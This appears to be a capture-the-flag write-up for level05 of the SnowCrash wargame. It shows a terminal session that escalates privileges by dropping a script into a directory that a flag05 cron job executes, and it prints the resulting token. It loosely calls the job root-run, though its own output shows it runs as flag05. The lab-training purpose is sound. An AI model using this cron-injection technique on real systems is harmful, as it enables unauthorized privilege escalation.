Level05 instructions

```
level05@SnowCrash:~$ ll
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout*
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc*
-r-x------  1 level05 level05  675 Apr  3  2012 .profile*
level05@SnowCrash:~$ ls
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
this is clearly can be exploits if we add some scripts on this directory `/opt/openarenaserver/` but we don't have permission to run it as flag05
```
level05@SnowCrash:~$ echo whoami > /opt/openarenaserver/test
level05@SnowCrash:~$ bash /usr/sbin/openarenaserver
+ whoami
level05
```
Let's go deeper 
```
level05@SnowCrash:~$ find / -name 'level05' 2>/dev/null
/var/mail/level05
/rofs/var/mail/level05
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:~$ ll /var/mail/level05
-rw-r--r--+ 1 root mail 58 Jan 11 15:30 /var/mail/level05
```
Now we get it, this is a cron run with root prev every 2 min
```
echo 'getflag >> /tmp/l05.txt' > /opt/openarenaserver/l05.sh
level05@SnowCrash:~$ ll /opt/openarenaserver/l05.sh
ls: cannot access /opt/openarenaserver/l05.sh: No such file or directory #deleted after 2 min
level05@SnowCrash:~$ cat /tmp/l05.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
level05@SnowCrash:~$ su level06
Password:


level06@SnowCrash:~$
```
